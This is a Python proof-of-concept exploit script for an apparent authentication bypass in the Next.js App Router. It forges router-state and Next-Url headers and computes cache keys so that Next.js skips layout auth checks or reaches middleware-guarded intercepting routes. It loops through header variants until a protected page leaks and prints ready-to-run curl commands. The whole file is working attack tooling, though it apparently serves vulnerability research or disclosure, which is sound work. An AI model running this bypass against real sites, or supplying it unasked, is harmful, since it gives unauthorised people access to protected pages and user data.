#!/usr/bin/env python3
"""Minimal PoC for Router State Forgery against Next.js App Router.

Forges `Next-Router-State-Tree` to claim the target's ancestor segments are already
client-rendered, so Next.js skips executing those layout components — including any
auth check inside them. See ../frameworks/next-js.md for the mechanism.

Usage:
    poc/next-js.py <url> [ancestor ...]
    poc/next-js.py --intercept <public-url> <next-url-path>
    poc/next-js.py --self-test

An ancestor is `segment` (static) or `param=value` (dynamic route segment). With no
ancestors given, every path segment but the last is claimed as static.

    poc/next-js.py http://127.0.0.1:3011/dashboard/secret
    poc/next-js.py http://localhost:3000/admin/customers/c1/notes admin customers customerId=c1

`--intercept` fetches a public URL with `Next-Url` claiming a middleware-guarded parent,
so an intercepting route defined under that parent renders while the middleware matcher
only sees the public path. It reports chunks absent from the plain response.

    poc/next-js.py --intercept http://localhost:3000/pub/1 /admin

Stdlib only. GET requests only, no cookies sent.
"""

import base64
import hashlib
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 15
# Marker Next.js embeds in a Flight payload when a layout/page calls redirect().
NEXT_REDIRECT = "NEXT_REDIRECT"
# Query param added to force the claimed __PAGE__ leaf to mismatch (see attempt()).
LEAF_BUST_PARAM = "_rsf"


def build_state_tree(ancestors, leaf_mode="page", tuple_length=4):
    """URL-encoded FlightRouterState claiming every `ancestors` entry is mounted.

    `ancestors` entries are either a str (static segment) or a (param, value) tuple
    (dynamic segment). Dynamic tuple length is version-dependent: 3 elements up to
    Next.js 16.2.6, 4 from 16.3.0 — superstruct enforces an exact count, so a wrong
    length is rejected before segment matching runs.
    """
    node = ["__PAGE__", {}, None, "metadata-only"] if leaf_mode == "metadata-only" else ["__PAGE__", {}]
    for seg in reversed(ancestors):
        if isinstance(seg, str):
            repr_ = seg
        else:
            repr_ = [seg[0], seg[1], "d", None] if tuple_length == 4 else [seg[0], seg[1], "d"]
        node = [repr_, {"children": node}]
    tree = ["", {"children": node}]
    return urllib.parse.quote(json.dumps(tree, separators=(",", ":")))


def _rsc_input(state_tree, next_url):
    # prefetchHeader and segmentPrefetchHeader are the literal "0" — neither is sent.
    return ",".join(["0", "0", state_tree, next_url])


def strong_key(state_tree, next_url):
    """SHA-256 of the cache-busting inputs, first 96 bits, base64url."""
    digest = hashlib.sha256(_rsc_input(state_tree, next_url).encode()).digest()[:12]
    return base64.b64encode(digest).decode().replace("+", "-").replace("/", "_").rstrip("=")


def legacy_key(state_tree, next_url):
    """djb2 hash of the same inputs, base36, first 5 chars."""
    h = 5381
    for ch in _rsc_input(state_tree, next_url):
        h = ((h << 5) + h + ord(ch)) & 0xFFFFFFFF
    digits = "0123456789abcdefghijklmnopqrstuvwxyz"
    out = ""
    while h:
        h, rem = divmod(h, 36)
        out = digits[rem] + out
    return (out or "0")[:5]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *_args, **_kwargs):
        return None


_FOLLOW = urllib.request.build_opener()
_NO_FOLLOW = urllib.request.build_opener(_NoRedirect)


def get(url, headers=None, follow=True):
    """GET `url`, returning (status, lowercased headers, body).

    `follow=False` is required for the baseline probe: the whole precondition is that
    the route answers 3xx, and urllib follows redirects by default — which would
    silently turn the redirect into the 200 of the login page. Forged requests do
    follow, since Next.js answers a guessed/legacy `_rsc` key with a 307 to the same
    path carrying a corrected key.
    """
    req = urllib.request.Request(url, headers=headers or {}, method="GET")
    opener = _FOLLOW if follow else _NO_FOLLOW
    try:
        with opener.open(req, timeout=TIMEOUT) as r:
            resp, body = r, r.read()
    except urllib.error.HTTPError as e:
        resp, body = e, e.read()
    except (urllib.error.URLError, TimeoutError) as e:
        print(f"[!] request failed: {e}")
        return None, {}, ""
    status = getattr(resp, "status", None) or resp.code
    # dict(resp.headers) loses the case-insensitive lookup, so normalize the keys.
    return status, {k.lower(): v for k, v in resp.headers.items()}, body.decode(errors="replace")


def attempt(url, ancestors, leaf_mode, tuple_length, key_mode):
    state_tree = build_state_tree(ancestors, leaf_mode, tuple_length)
    next_url = "/" + "/".join(s if isinstance(s, str) else s[1] for s in ancestors)
    key = legacy_key(state_tree, next_url) if key_mode == "legacy" else strong_key(state_tree, next_url)

    parts = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parts.query)
    # The claimed leaf carries empty props ({}), so a request whose query string also
    # matches means the leaf matches too — the server then treats the whole claimed
    # subtree INCLUDING the leaf as already client-cached and returns an empty diff.
    # An extra param forces the leaf to mismatch and render fresh. Safe to always add:
    # the _rsc key is derived from headers only, never from the query string.
    query.append((LEAF_BUST_PARAM, "1"))
    query.append(("_rsc", key))
    forged = urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(query)))

    status, headers, body = get(
        forged,
        {"RSC": "1", "Next-Router-State-Tree": state_tree, "Next-Url": next_url},
    )
    ok = (
        status == 200
        and "text/x-component" in headers.get("content-type", "")
        and NEXT_REDIRECT not in body
        # An empty diff satisfies every check above while disclosing nothing.
        and bool(body.strip())
    )
    return ok, forged, state_tree, next_url, status, body


CHUNK_RE = re.compile(r"(?:_next/)?static/chunks/[a-zA-Z0-9._\-/~]+\.js")


def extract_chunks(body):
    """`static/chunks/*.js` refs in a body, normalized to `_next/...` so both spellings compare equal."""
    return {m if m.startswith("_next/") else "_next/" + m for m in CHUNK_RE.findall(body)}


def new_chunks(baseline_body, body):
    return sorted(extract_chunks(body) - extract_chunks(baseline_body))


def intercept(url, next_url):
    print(f"[*] public:   {url}")
    print(f"[*] Next-Url: {next_url}")
    status, _, plain = get(url)
    print(f"[*] baseline: {status}")
    if status is None:
        return 1
    st, _, body = get(url, {"Next-Url": next_url})
    fresh = new_chunks(plain, body) if st and 200 <= st < 300 else []
    if not fresh:
        print(f"[!] no new chunks (status={st}) — no intercepting route for this pair, or the guard didn't match")
        return 1
    print(f"\n[+] INTERCEPT — {len(fresh)} chunk(s) only served with Next-Url\n")
    print(f"curl -s '{url}' \\\n  -H 'Next-Url: {next_url}'\n")
    for c in fresh:
        print(f"    {c}")
    return 0


def parse_ancestor(arg):
    if "=" in arg:
        param, _, value = arg.partition("=")
        return (param, value)
    return arg


def self_test():
    """Wire shapes must match the format documented in ../frameworks/next-js.md."""
    d = lambda *a, **kw: json.loads(urllib.parse.unquote(build_state_tree(*a, **kw)))
    assert d(["dashboard"]) == ["", {"children": ["dashboard", {"children": ["__PAGE__", {}]}]}]
    assert d(["organizations", "acme"]) == [
        "",
        {"children": ["organizations", {"children": ["acme", {"children": ["__PAGE__", {}]}]}]},
    ]
    assert d(["dashboard"], "metadata-only") == [
        "",
        {"children": ["dashboard", {"children": ["__PAGE__", {}, None, "metadata-only"]}]},
    ]
    assert d([("org", "acme")]) == ["", {"children": [["org", "acme", "d", None], {"children": ["__PAGE__", {}]}]}]
    assert d([("org", "acme")], "page", 3) == ["", {"children": [["org", "acme", "d"], {"children": ["__PAGE__", {}]}]}]
    # Key derivations are pure functions of the header inputs.
    assert strong_key("tree", "/dashboard") == strong_key("tree", "/dashboard")
    assert strong_key("tree", "/dashboard") != strong_key("tree", "/other")
    assert legacy_key("tree", "/dashboard") != strong_key("tree", "/dashboard")
    assert len(legacy_key("tree", "/dashboard")) <= 5
    # Chunk refs: Flight omits `_next/`, HTML includes it; both are the same chunk.
    assert extract_chunks('["static/chunks/a.js"] <script src="/_next/static/chunks/a.js">') == {"_next/static/chunks/a.js"}
    assert new_chunks("static/chunks/a.js", "_next/static/chunks/a.js static/chunks/app/admin/b~1.js") == [
        "_next/static/chunks/app/admin/b~1.js"
    ]
    assert new_chunks("static/chunks/a.js", "static/chunks/a.js") == []
    print("[+] self-test passed")


def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        return 1
    if args[0] == "--self-test":
        self_test()
        return 0
    if args[0] == "--intercept":
        if len(args) != 3:
            print(__doc__)
            return 1
        return intercept(args[1], args[2])

    url = args[0]
    path_segments = [s for s in urllib.parse.urlsplit(url).path.split("/") if s]
    ancestors = [parse_ancestor(a) for a in args[1:]] or path_segments[:-1]
    if not ancestors:
        print("[!] need at least one ancestor segment to claim")
        return 1

    print(f"[*] target:   {url}")
    print(f"[*] claiming: {ancestors}")

    # Only routes that redirect an unauthenticated request are worth forging against.
    status, _, _ = get(url, follow=False)
    print(f"[*] baseline: {status}")
    if status is None:
        return 1
    if not 300 <= status < 400:
        print("[!] baseline is not a redirect — nothing to bypass (continuing anyway)")

    for leaf_mode in ("page", "metadata-only"):
        for tuple_length in (4, 3):
            for key_mode in ("legacy", "strong"):
                ok, forged, tree, next_url, st, body = attempt(url, ancestors, leaf_mode, tuple_length, key_mode)
                label = f"leaf={leaf_mode} tuple={tuple_length} key={key_mode}"
                if not ok:
                    print(f"[-] {label}: status={st}")
                    continue
                kind = "BYPASS — full body" if leaf_mode == "page" else "WEAK BYPASS — metadata only"
                print(f"\n[+] {kind} ({label})\n")
                if leaf_mode == "metadata-only":
                    print("    Narrower disclosure: generateMetadata() output, not the page body.")
                    print("    If the route defines no generateMetadata, this leaks nothing")
                    print("    sensitive — try a more specific ancestor claim before trusting it.\n")
                print(f"curl -sL '{forged}' \\\n  -H 'RSC: 1' \\\n  -H 'Next-Router-State-Tree: {tree}' \\\n  -H 'Next-Url: {next_url}'\n")
                print(body)
                return 0

    print("\n[!] no bypass — layout may not gate, or the ancestor claim is wrong")
    print("    for a dynamic ancestor, pass it as param=value (the real [param] name)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
